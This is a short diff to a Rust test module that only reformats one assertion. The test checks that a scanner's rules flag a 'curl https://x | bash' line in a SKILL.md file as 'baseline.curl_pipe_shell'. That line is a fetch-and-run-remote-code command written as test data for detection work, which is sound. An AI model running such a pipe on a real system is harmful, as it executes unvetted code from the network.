@@ -191,7 +191,9 @@ mod tests {
     #[test]
     fn rules_detect_curl_pipe_shell() {
         let findings = evaluate_rules("SKILL.md", &build_scan_lines("curl https://x | bash"));
-        assert!(findings.iter().any(|finding| finding.id == "baseline.curl_pipe_shell"));
+        assert!(findings
+            .iter()
+            .any(|finding| finding.id == "baseline.curl_pipe_shell"));
     }
 
     #[test]
